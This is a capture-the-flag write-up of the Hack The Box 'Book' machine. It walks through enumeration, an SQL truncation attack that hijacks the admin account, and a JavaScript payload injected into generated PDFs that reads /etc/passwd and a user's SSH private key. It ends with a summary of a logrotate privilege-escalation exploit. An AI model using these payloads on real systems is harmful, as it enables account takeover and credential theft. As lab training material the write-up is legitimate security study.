################################################################################
############################ BOOK  - HTB #######################################
######################        By Shad       ####################################
################################################################################

This Linux box is on 10.10.10.176 and was submitted by MrR3boot.
We add the box to our hosts file as book.htb.
```
$ echo "10.10.10.176    book.htb" >> /etc/hosts
```

We start by a nmap scan:

```
$ nmap -sC -sV -oA nmap/initial book.htb
# Nmap 7.80 scan initiated Mon May 11 19:23:54 2020 as: nmap -sC -sV -oA nmap/initial book.htb
Nmap scan report for book.htb (10.10.10.176)
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 11 19:24:02 2020 -- 1 IP address (1 host up) scanned in 7.69 seconds
```

Complete scan was ran too but does not show any more open ports.
We find SSH on port 22 & HTTP on port 80. HTTP is Apache 2.4.29 for Ubuntu.
We run gobuster on the Apache server to find stuff:

```
$ gobuster dir --url http://book.htb --wordlist /usr/share/wordlists/dirb/small.txt -f
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://book.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Add Slash:      true
[+] Timeout:        10s
===============================================================
2020/05/11 19:27:25 Starting gobuster
===============================================================
/admin/ (Status: 200)
/docs/ (Status: 403)
/images/ (Status: 403)
/icons/ (Status: 403)
===============================================================
2020/05/11 19:27:28 Finished
===============================================================
```

Using firefox, we'll see what this website is about.
This website is written in PHP. It is a Library website that allows download of
books.

The "Books" tab shows a table of a list of downloadble books (each one is a
Flower?). The table shows for each book an image of a flower with a PHP link:
```
http://10.10.10.176/download.php?file=1
```
That "?file=1" for fuzzing ? 

The "Collections" tab allows us to upload files. It could be used to
upload a PHP reverse shell maybe ?

The "Contact Us" tab shows a "Contact Admin" form which leaks the email:
"admin@book.htb".


We re-run the gobuster with the .php extension and the PHPSESSID cookie
set to enumerate accessible webpages from a connected user.
```
$ gobuster dir -c "PHPSESSID=pedmveo9vpska32v8vvu83u170" --wordlist /usr/share/wordlists/dirb/common.txt --url http://book.htb/ -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://book.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=pedmveo9vpska32v8vvu83u170
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/12 13:42:03 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/admin (Status: 301)
/books.php (Status: 200)
/contact.php (Status: 200)
/db.php (Status: 200)
/docs (Status: 301)
/download.php (Status: 200)
/feedback.php (Status: 200)
/home.php (Status: 200)
/images (Status: 301)
/index.php (Status: 302)
/index.php (Status: 302)
/logout.php (Status: 302)
/profile.php (Status: 302)
/search.php (Status: 302)
/server-status (Status: 403)
/settings.php (Status: 302)
===============================================================
2020/05/12 13:42:14 Finished
===============================================================
```

We add a reverseshell.php file with our config in the working directory,
this should become useful soon.

Will try to upload the reverse shell to the collections forms, and find
if we can get it executed.

We download every (4) files of the /books.php page. The link is:
```
http://book.htb/download.php?file=1
```
Incrementing that `file=x` parameter will download empty pdf files
(5.pdf => 0 bytes) etc...

Using the 4 files, we look for perhaps stegano clues but no luck yet ?
Trying strings on the files ... nothing worth noting.

We'll play with the register method with Burp. Forwarding the register POST req
we try to add a "role=admin" parameter on account creation. When going to
/profile.php we find that our user still has role set as "User".

Upon inspecting the sign up page html, we find a javascript function used to
validate the sign up form:
```
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
```
This is frontend validation of a form, which means perhaps backend does not
validate whatever is sent. This hints that we are in presence of a SQL
Truncation vulnerability.
Using BurpSuite, we intercept and edit the following POST /index.php body:
```
name=admin&email=admin%40book.htb%20%20%20%20%20%20%20%20%20%20%20%20%20%20%201&password=SHADISLOVE
```
We've added URL encoded whitespace after "admin@book.htb" then a random char.
When the SQL engine validates the command, it does not find a collision with the
email, then truncates the whitespace, effectively setting our password to the
admin@book.htb account. Navigating to the /admin/ panel, we are able to login
as an admin in the platform.

As admin, we'll enumerate the accessible admin webpages using gobuster and a
bigger wordlist. Perhaps using common.txt or small.txt did not yield everything
there was to be found:
```
$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c "PHPSESSID=70c2qupsr499gqm42v1t8hd8vh" --url http://book.htb/admin/ -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://book.htb/admin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=70c2qupsr499gqm42v1t8hd8vh
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/14 12:56:40 Starting gobuster
===============================================================
/index.php (Status: 200)
/home.php (Status: 200)
/feedback.php (Status: 200)
/users.php (Status: 200)
/messages.php (Status: 200)
/export (Status: 301)
/vendor (Status: 301)
/collections.php (Status: 200)
===============================================================
2020/05/14 13:05:23 Finished
===============================================================
```
Not much more to find from previous scans.

Moving back to low privilege user, we realize that uploading a file via the
"Coolection" tab allows us to find our "book" (i.e the rev shell php) in the
/search.php page. Its extension has been changed to .pdf, but its still
the same file, containing our php payload. 

Using forum hints, we realize we need to find a XSS vulnerability from the user
account, then trigger it from the admin panel. The options for an user to inject
stuff are:
    - /feedback.php
        A feedback form, containing 2 fields: "Book Title" and Feedback

    - /collections.php
       A Book upload form, containing 3 fields: "Book Title", "Author" and a file upload

    - /contact.php
       A contact form, containing 3 fields:
           "To" : "admin@book.htb" => Greyed out
	   "From": "user@chaz.pro" => Greyed out
           "Message". Upon inspection with Burp


Using Discord hints, we realize the vulnerability lies in the PDF generation of
the "Collection" file accessible in the Admin panel. By submitting from the user
/collection.php page a book, we can inject JS code to be executed by the pdf gen.
Link describing the vuln:
https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

We upload a book using this Book Title field:

```
 <script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script> 
```

Then, we download the Collection pdf from the admin panel. The pdf file is
populated with the contents of /etc/passwd. Upon reading, we find 1 user
with a login shell, whose name is "reader". We use the same vulnerability
as before to exfil reader's ssh key:

```
```
 <script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script> 
```

We then download the collection pdf which is populated with the user's priv key.
The document's width not being adapted for such file, we move the pdf file to
our windows box, open it with Acrobat Reader and are able to read whole contents
of the key. When moving the key back to our Linux Box, we use `dos2unix` to
remove the CRLF.

```
$ ssh -i reader_id_rsa reader@book.htb
reader@book:~$ cat user.txt | wc -c
33
```
We owned user.

# PrivEscalation:
I did not realize PrivEsc before the box got retired, but read other player's
writeups for it. Key take-aways were:
 - Use pspy and watch what commands are run at the moment
 - Find an odd `logrotate` command, check its version: 3.11.0
 - Google logrotate v3.11.0 & find the exploit called logrotten
 - Use exploit, get reverse shell as root, win the box



Shad


